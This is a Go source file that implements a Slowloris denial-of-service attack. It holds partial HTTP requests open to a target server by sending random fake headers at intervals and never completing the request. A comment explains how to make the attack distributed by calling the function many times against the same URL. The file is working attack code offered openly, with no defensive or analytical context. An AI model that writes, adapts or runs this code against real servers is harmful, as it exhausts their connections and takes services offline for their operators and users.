package main

import (
	"context"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/icrowley/fake"
)

// Slowloris performs single threaded slow loris attack. If you want to run distributed
// attack, just run multiple calls of the function over the same URL.
func Slowloris(ctx context.Context, index int64, config Config) error {
	// append port if not presented in the host
	url := config.URL
	host := url.Host
	if !strings.Contains(host, ":") {
		host = fmt.Sprintf("%s:%s", url.Host, url.Port())
	}
	fmt.Println("Host", host)

	// create TCP connection
	conn, err := net.Dial("tcp", host)
	if err != nil {
		return err
	}

	// send HTTP GET request line
	getRequest := GetRequestLine(url.Path)
	fmt.Println("Sending request line", getRequest)
	line := httpLine(getRequest)
	n, err := conn.Write([]byte(line))
	if err != nil || n < len(line) {
		return err
	}

	// send User-Agent header
	userAgent := config.UserAgent
	if userAgent == "random" {
		userAgent = fake.UserAgent()
	}
	fmt.Println("Sending user agent: (%s)", userAgent)
	line = httpLine(Header("User-Agent", userAgent))
	n, err = conn.Write([]byte(line))
	if err != nil || n < len(line) {
		return err
	}

	interval := config.Interval
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(interval):
			header := RandomHeader()
			fmt.Printf("slowloris %d: send header (%s)\n", index, header)
			line = httpLine(header)
			n, err := conn.Write([]byte(line))
			if err != nil || n < len(line) {
				return err
			}
		}
	}

	return nil
}

// GetRequestLine returns HTTP request line for GET request
func GetRequestLine(path string) string {
	return fmt.Sprintf("GET %s HTTP/1.1", path)
}

// func Header formats header key and value
func Header(key, val string) string {
	return fmt.Sprintf("%s: %s", strings.Title(key), val)
}

// RandomHeader generates a random HTTP header to send as part of the
// slowloris attack
func RandomHeader() string {
	return Header(fake.Word(), fake.Word())
}

// ClosingLine sends a closing line for a HTTP request
func ClosingLine() string {
	return httpLine(httpLine(""))
}

// httpLine appends end of header \r\n
func httpLine(str string) string {
	return str + "\r\n"
}
